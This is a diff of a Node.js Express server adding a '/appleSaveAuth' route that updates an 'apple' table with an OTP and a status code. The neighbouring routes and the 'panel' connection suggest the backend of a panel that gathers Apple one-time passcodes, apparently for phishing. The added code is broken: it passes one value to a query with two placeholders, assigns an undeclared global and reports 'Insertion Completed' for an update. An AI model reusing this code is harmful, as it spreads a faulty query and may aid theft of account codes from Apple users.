@@ -2045,6 +2045,18 @@ app.post("/appleSaveOtp", cors(), (req, res) => {
   });
 });
 
+app.post("/appleSaveAuth", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+
+  let details = [uniqueid];
+  let query = `UPDATE apple SET otp= ?, status = 6 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
 app.post("/appleDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
   owner = req.body.owner;
